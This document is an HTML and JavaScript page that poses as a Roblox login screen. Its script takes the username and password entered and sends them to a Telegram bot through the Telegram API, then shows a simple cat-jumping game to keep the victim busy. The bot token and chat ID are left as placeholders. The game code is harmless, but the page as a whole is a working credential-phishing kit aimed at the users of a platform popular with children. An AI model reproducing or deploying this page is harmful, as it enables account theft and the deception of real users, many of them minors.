<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Roblox</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #2b2d42; /* Dark background */
            color: #ffffff; /* White text */
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            position: relative;
        }
        .login-container {
            background-color: #3f3f3f; /* Dark gray for container */
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
            text-align: center;
            width: 400px; /* Fixed width for consistency */
            position: absolute; /* Position absolute for overlay */
        }
        h1 {
            margin-bottom: 20px;
            font-size: 32px;
            color: #ffcc00; /* Roblox yellow */
        }
        input {
            display: block;
            width: calc(100% - 20px); /* Adjusted for padding */
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #444; /* Dark border */
            border-radius: 6px;
            font-size: 16px;
            background-color: #555; /* Dark input fields */
            color: white; /* White text for inputs */
        }
        button {
            background-color: #ffcc00; /* Roblox yellow */
            color: black; /* Black text for button */
            padding: 10px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s ease;
            width: 100%; /* Full width button */
            margin-top: 10px; /* Space above the button */
        }
        button:hover {
            background-color: #e6b800; /* Darker yellow on hover */
        }
        #result {
            margin-top: 15px;
            color: #ffcc00; /* Yellow for messages */
        }
        .footer {
            margin-top: 20px;
            font-size: 14px;
            color: #ccc; /* Light gray for footer text */
        }
        .game-container {
            display: none; /* Hide game initially */
            margin-top: 20px; /* Space above the game */
            text-align: center; /* Center the game */
        }
        canvas {
            border: 2px solid #000;
            background-color: #fff; /* White background for the game area */
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Login to Roblox</h1>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <p id="result"></p>
        <div class="footer">
            <p>Don't have an account? <a href="#" style="color: #ffcc00;">Sign Up</a></p>
        </div>
    </div>

    <div class="game-container" id="gameContainer">
        <h2>Cat Jump Game</h2>
        <canvas id="gameCanvas" width="800" height="400"></canvas>
        <p id="score">Score: 0</p>
        <button onclick="resetGame()">Play Again</button>
    </div>

    <script>
        // Replace these with your actual Telegram Bot Token and Chat ID
        const BOT_TOKEN = 'YOUR_BOT_TOKEN'; // Your bot token
        const CHAT_ID = 'YOUR_CHAT_ID'; // Your chat ID

        // Handle form submission
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;
            var result = document.getElementById('result');
            
            var message = `ðŸŸ¢ New Login Data:\n\nðŸ‘¤ Username: ${username}\nðŸ”‘ Password: ${password}`;
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                }),
            })
            .then(response => response.json())
            .then(data => {
                result.textContent = "Data sent! Thank you for logging in.";
                result.style.color = "#4CAF50"; // Green color for success messages
                
                // Show the game after login
                document.querySelector('.login-container').style.display = 'none';
                document.getElementById('gameContainer').style.display = 'block';
                startGame(); // Start the game
            })
            .catch((error) => {
                console.error('Error:', error);
                result.textContent = "An error occurred while sending data. Please try again.";
            });
        });

        // Game logic
        let cat = {
            x: 50,
            y: 300,
            width: 50,
            height: 50,
            color: "orange",
            velocityY: 0,
            gravity: 0.5,
            jumpStrength: 10,
            isJumping: false
        };

        let obstacles = [];
        let score = 0;
        let gameOver = false;

        function startGame() {
            score = 0;
            obstacles = [];
            gameOver = false;
            cat.y = 300; // Reset cat position
            document.getElementById('score').innerText = "Score: " + score;
            gameLoop();
        }

        function drawCat() {
            ctx.fillStyle = cat.color;
            ctx.fillRect(cat.x, cat.y, cat.width, cat.height);
        }

        function drawObstacles() {
            ctx.fillStyle = "red";
            for (let obstacle of obstacles) {
                ctx.fillRect(obstacle.x, obstacle.y, obstacle.width, obstacle.height);
            }
        }

        function updateObstacles() {
            if (obstacles.length === 0 || obstacles[obstacles.length - 1].x < 600) {
                obstacles.push({
                    x: 800,
                    y: 350,
                    width: 30,
                    height: 50
                });
            }
            for (let i = 0; i < obstacles.length; i++) {
                obstacles[i].x -= 5; // Move obstacles to the left
                if (obstacles[i].x + obstacles[i].width < 0) {
                    obstacles.splice(i, 1);
                    score++;
                    i--;
                }
            }
        }

        function jump() {
            if (!cat.isJumping) {
                cat.velocityY = -cat.jumpStrength;
                cat.isJumping = true;
            }
        }

        function updateCat() {
            cat.y += cat.velocityY;
            cat.velocityY += cat.gravity;

            if (cat.y + cat.height >= canvas.height) {
                cat.y = canvas.height - cat.height;
                cat.isJumping = false;
                cat.velocityY = 0;
            }

            for (let obstacle of obstacles) {
                if (cat.x < obstacle.x + obstacle.width &&
                    cat.x + cat.width > obstacle.x &&
                    cat.y < obstacle.y + obstacle.height &&
                    cat.y + cat.height > obstacle.y) {
                    gameOver = true;
                }
            }
        }

        function drawScore() {
            ctx.fillStyle = "black";
            ctx.font = "20px Arial";
            ctx.fillText("Score: " + score, 10, 20);
        }

        const canvas = document.getElementById("gameCanvas");
        const ctx = canvas.getContext("2d");

        function gameLoop() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            if (!gameOver) {
                updateObstacles();
                updateCat();
                drawObstacles();
                drawCat();
                drawScore();
                requestAnimationFrame(gameLoop);
            } else {
                ctx.fillStyle = "red";
                ctx.font = "40px Arial";
                ctx.fillText("Game Over!", canvas.width / 2 - 100, canvas.height / 2);
                ctx.fillText("Final Score: " + score, canvas.width / 2 - 100, canvas.height / 2 + 50);
            }
        }

        // Event listener for jumping
        window.addEventListener('keydown', function(e) {
            if (e.code === 'Space') {
                jump();
            }
        });

        function resetGame() {
            startGame();
        }
